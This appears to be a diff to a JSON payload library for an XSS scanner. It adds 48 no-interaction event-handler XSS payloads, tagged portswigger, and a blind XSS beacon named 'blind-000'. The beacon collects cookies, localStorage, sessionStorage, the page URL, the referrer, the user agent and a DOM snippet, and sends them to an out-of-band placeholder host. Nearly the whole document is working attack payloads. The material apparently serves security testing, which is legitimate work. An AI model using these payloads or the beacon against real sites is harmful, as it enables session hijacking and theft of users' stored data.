@@ -41,7 +41,8 @@
       "script_gadget",
       "css_exfil",
       "data_uri",
-      "html5_new"
+      "html5_new",
+      "portswigger_events"
     ]
   },
   "payloads": [
@@ -751,6 +752,18 @@
       "confidence": "low",
       "payload": "<iframe srcdoc=\"<script>Object.prototype.hasOwnProperty=()=>1;alert(1)</script>\">",
       "note": "Prototype pollution to XSS primitive"
+    },
+    {
+      "id": "blind-000",
+      "context": "blind_oob",
+      "tags": [
+        "oob",
+        "blind",
+        "collection"
+      ],
+      "confidence": "high",
+      "payload": "<script>try{var q='?c='+encodeURIComponent(document.cookie)+'&l='+encodeURIComponent((window.localStorage&&JSON.stringify(localStorage)||'').slice(0,1200))+'&s='+encodeURIComponent((window.sessionStorage&&JSON.stringify(sessionStorage)||'').slice(0,600))+'&r='+encodeURIComponent(document.referrer)+'&p='+encodeURIComponent(location.href)+'&u='+encodeURIComponent(navigator.userAgent)+'&d='+encodeURIComponent(document.documentElement.innerHTML.slice(0,1200));(new Image()).src='https://__OOB__/'+q}catch(e){(new Image()).src='https://__OOB__/?e='+encodeURIComponent(''+e)}</script>",
+      "note": "ezXSS/XSSHunter-style collection beacon (Phase 188): cookies c=, localStorage l=, sessionStorage s=, referrer r=, URL p=, User-Agent u=, DOM snippet d=; e= carries a collector error. Placed FIRST -- the blind layer injects exactly one payload per (url, param), so the one shot collects everything. Values are length-capped so the beacon URL stays within common server limits."
     },
     {
       "id": "oob-001",
@@ -13705,6 +13718,582 @@
       "confidence": "medium",
       "payload": "<style>@keyframes xsskf{}</style><xss style=\"animation-name:xsskf;animation-duration:1s\" onanimationstart=alert(1)></xss>",
       "note": "Fires when the CSS animation starts; needs no user interaction. Sandbox verdict: unknown (cannot model a running animation) -- browser-verified family, hence medium confidence."
+    },
+    {
+      "id": "ps-ev-001",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<body onhashchange=alert(1)>",
+      "note": "fires on hash change; the PoC hash-trigger flow changes it"
+    },
+    {
+      "id": "ps-ev-002",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<body onpopstate=alert(1)>",
+      "note": "fires on history navigation"
+    },
+    {
+      "id": "ps-ev-003",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<body onpageshow=alert(1)>",
+      "note": "fires on page load (including bfcache restores)"
+    },
+    {
+      "id": "ps-ev-004",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<body onbeforeprint=alert(1)>",
+      "note": "fires on print dialog"
+    },
+    {
+      "id": "ps-ev-005",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<body onunload=alert(1)>",
+      "note": "fires on navigation away"
+    },
+    {
+      "id": "ps-ev-006",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<body onbeforeunload=alert(1)>",
+      "note": "fires before navigation away"
+    },
+    {
+      "id": "ps-ev-007",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<body onresize=alert(1)>",
+      "note": "fires on window resize"
+    },
+    {
+      "id": "ps-ev-008",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<body onscroll=alert(1)>",
+      "note": "fires when the page scrolls (overflow content)"
+    },
+    {
+      "id": "ps-ev-009",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<body onscrollend=alert(1)>",
+      "note": "Chrome 114+ scroll completion"
+    },
+    {
+      "id": "ps-ev-010",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<body onscrollsnapchange=alert(1)>",
+      "note": "Chrome 129+ scroll-snap event"
+    },
+    {
+      "id": "ps-ev-011",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<body onmessage=alert(1)>",
+      "note": "window message event via body content attribute"
+    },
+    {
+      "id": "ps-ev-012",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<body onunhandledrejection=alert(1)>",
+      "note": "fires when a promise rejection is unhandled"
+    },
+    {
+      "id": "ps-ev-013",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<body onpagereveal=alert(1)>",
+      "note": "Chrome 123+ navigation reveal event"
+    },
+    {
+      "id": "ps-ev-014",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<style>@keyframes x{}</style><b style=\"animation-name:x\" onanimationend=alert(1)>",
+      "note": "CSS animation events fire on load when animation-name is set"
+    },
+    {
+      "id": "ps-ev-015",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<style>@keyframes x{}</style><b style=\"animation-name:x\" onanimationiteration=alert(1)>",
+      "note": "CSS animation events fire on load when animation-name is set"
+    },
+    {
+      "id": "ps-ev-016",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<style>@keyframes x{}</style><b style=\"animation-name:x\" onanimationcancel=alert(1)>",
+      "note": "CSS animation events fire on load when animation-name is set"
+    },
+    {
+      "id": "ps-ev-017",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<style>@keyframes x{}</style><b style=\"animation-name:x\" onwebkitanimationstart=alert(1)>",
+      "note": "CSS animation events fire on load when animation-name is set"
+    },
+    {
+      "id": "ps-ev-018",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<style>@keyframes x{}</style><b style=\"animation-name:x\" onwebkitanimationend=alert(1)>",
+      "note": "CSS animation events fire on load when animation-name is set"
+    },
+    {
+      "id": "ps-ev-019",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<style>@keyframes x{}</style><b style=\"animation-name:x\" onwebkitanimationiteration=alert(1)>",
+      "note": "CSS animation events fire on load when animation-name is set"
+    },
+    {
+      "id": "ps-ev-020",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<span style=\"transition:color 1s\" ontransitionrun=alert(1)>",
+      "note": "CSS transition events (cheat-sheet no_interaction shape)"
+    },
+    {
+      "id": "ps-ev-021",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<span style=\"transition:color 1s\" ontransitionstart=alert(1)>",
+      "note": "CSS transition events (cheat-sheet no_interaction shape)"
+    },
+    {
+      "id": "ps-ev-022",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<span style=\"transition:color 1s\" ontransitionend=alert(1)>",
+      "note": "CSS transition events (cheat-sheet no_interaction shape)"
+    },
+    {
+      "id": "ps-ev-023",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<span style=\"transition:color 1s\" ontransitioncancel=alert(1)>",
+      "note": "CSS transition events (cheat-sheet no_interaction shape)"
+    },
+    {
+      "id": "ps-ev-024",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<span style=\"transition:color 1s\" onwebkittransitionend=alert(1)>",
+      "note": "CSS transition events (cheat-sheet no_interaction shape)"
+    },
+    {
+      "id": "ps-ev-025",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<address onsecuritypolicyviolation=alert(1)><img src=x>",
+      "note": "fires when the page CSP blocks the companion <img>; the one handler that turns a strict CSP against itself"
+    },
+    {
+      "id": "ps-ev-026",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onplay=alert(1) src=x>",
+      "note": "media element event (cheat-sheet shape; verifier gates executability)"
+    },
+    {
+      "id": "ps-ev-027",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onplaying=alert(1) src=x>",
+      "note": "media element event (cheat-sheet shape; verifier gates executability)"
+    },
+    {
+      "id": "ps-ev-028",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video oncanplaythrough=alert(1) src=x>",
+      "note": "media element event (cheat-sheet shape; verifier gates executability)"
+    },
+    {
+      "id": "ps-ev-029",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video ondurationchange=alert(1) src=x>",
+      "note": "media element event (cheat-sheet shape; verifier gates executability)"
+    },
+    {
+      "id": "ps-ev-030",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onloadedmetadata=alert(1) src=x>",
+      "note": "media element event (cheat-sheet shape; verifier gates executability)"
+    },
+    {
+      "id": "ps-ev-031",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onprogress=alert(1) src=x>",
+      "note": "media element event (cheat-sheet shape; verifier gates executability)"
+    },
+    {
+      "id": "ps-ev-032",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onwaiting=alert(1) src=x>",
+      "note": "media element event (cheat-sheet shape; verifier gates executability)"
+    },
+    {
+      "id": "ps-ev-033",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onsuspend=alert(1) src=x>",
+      "note": "media element event (cheat-sheet shape; verifier gates executability)"
+    },
+    {
+      "id": "ps-ev-034",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onended=alert(1) src=x>",
+      "note": "media element event (cheat-sheet shape; verifier gates executability)"
+    },
+    {
+      "id": "ps-ev-035",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onwebkitneedkey=alert(1) src=x>",
+      "note": "media element event (cheat-sheet shape; verifier gates executability)"
+    },
+    {
+      "id": "ps-ev-036",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<camera onloadedmetadata=alert(1) src=x>",
+      "note": "camera tag coverage per cheat sheet"
+    },
+    {
+      "id": "ps-ev-037",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video><track oncuechange=alert(1)></video>",
+      "note": "text track cue change"
+    },
+    {
+      "id": "ps-ev-038",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<object onloadend=alert(1) data=x>",
+      "note": "ProgressEvent loadend"
+    },
+    {
+      "id": "ps-ev-039",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input onvalidationstatuschange=alert(1) required>",
+      "note": "form validation status (newer API)"
+    },
+    {
+      "id": "ps-ev-040",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<slot onslotchange=alert(1)>x</slot>",
+      "note": "slot tag + slotchange event"
+    },
+    {
+      "id": "ps-ev-041",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<address hidden=\"until-found\" onbeforematch=alert(1)>",
+      "note": "fires when hidden=until-found is revealed"
+    },
+    {
+      "id": "ps-ev-042",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<style>@keyframes x{}</style><br style=\"animation-name:x\" onanimationend=alert(1)>",
+      "note": "br tag coverage per cheat sheet"
+    },
+    {
+      "id": "ps-ev-043",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<script onbeforescriptexecute=alert(1)></script>",
+      "note": "fires before any script executes"
+    },
+    {
+      "id": "ps-ev-044",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<script onafterscriptexecute=alert(1)></script>",
+      "note": "fires after script execution"
+    },
+    {
+      "id": "ps-ev-045",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<marquee onshow=alert(1)>x</marquee>",
+      "note": "marquee show event"
+    },
+    {
+      "id": "ps-ev-046",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<svg><animate onfinish=alert(1) attributeName=x dur=1s></animate></svg>",
+      "note": "SMIL animation finish"
+    },
+    {
+      "id": "ps-ev-047",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<svg><animate onbounce=alert(1) attributeName=x dur=1s></animate></svg>",
+      "note": "SMIL bounce event"
+    },
+    {
+      "id": "ps-ev-048",
+      "context": "portswigger_events",
+      "tags": [
+        "portswigger",
+        "no_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video ontimeupdate=alert(1) src=x>",
+      "note": "media playback-position event (completes the cheat-sheet no_interaction event set)"
     }
   ],
   "polyglots": [
